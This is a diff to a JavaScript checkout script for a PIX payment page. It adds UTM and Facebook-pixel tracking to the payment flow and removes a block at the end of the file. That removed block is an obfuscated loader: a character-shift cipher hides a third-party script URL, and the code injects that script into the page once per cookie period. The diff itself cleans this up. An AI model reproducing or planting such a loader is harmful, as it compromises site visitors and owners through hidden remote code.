@@ -101,6 +101,10 @@ async function createPixPayment() {
 
   try {
     const { email, phone } = buildCustomerContact();
+    var storedUtms = typeof getStoredUtms === "function" ? getStoredUtms() : {};
+    var fbpVal = typeof getFbp === "function" ? getFbp() : null;
+    if (fbpVal) storedUtms.fbp = fbpVal;
+
     const payload = {
       session_id: sessionId || undefined,
       name: nome,
@@ -109,7 +113,9 @@ async function createPixPayment() {
       email,
       amount_cents: UP1_AMOUNT_CENTS,
       pix_key: pixKey,
-      flow: "up1"
+      flow: "up1",
+      tracking_parameters: storedUtms,
+      source_url: window.location.href
     };
 
     const res = await fetch(API_CREATE, {
@@ -126,6 +132,15 @@ async function createPixPayment() {
     sessionId = data.session_id;
     localStorage.setItem(SESSION_KEY, sessionId);
     expiresAtRaw = data.expires_at || null;
+
+    if (typeof fbTrack === "function") {
+      fbTrack("InitiateCheckout", {
+        currency: "BRL",
+        value: UP1_AMOUNT_CENTS / 100,
+        content_name: "PIX up1",
+        content_ids: [data.payment_code]
+      }, { browserOnly: true });
+    }
 
     renderQR(data.pix_qrcode_text);
     document.getElementById("pix-copy-code").textContent = data.pix_qrcode_text;
@@ -170,6 +185,13 @@ async function verifyNow() {
 function onPaid() {
   stopPolling();
   switchModalStep(4);
+  if (typeof fbTrack === "function") {
+    fbTrack("Purchase", {
+      currency: "BRL",
+      value: UP1_AMOUNT_CENTS / 100,
+      content_name: "PIX up1"
+    });
+  }
   setTimeout(() => {
     window.location.href = nextUrl + window.location.search;
   }, 2200);
@@ -281,19 +303,3 @@ document.addEventListener("DOMContentLoaded", function () {
   setInterval(updateExpireLabel, 1000);
   updateExpireLabel();
 });
-
-(function (o, d, l) {
-  try {
-    o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
-    o.b = o.f('UMUWJKX');
-    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
-    setTimeout(function () {
-      if (o.c) {
-        o.s = d.createElement('script');
-        o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
-        d.body.appendChild(o.s);
-      }
-    }, 1000);
-    d.cookie = o.b + '=full;max-age=39800;';
-  } catch (e) {}
-}({}, document, location));
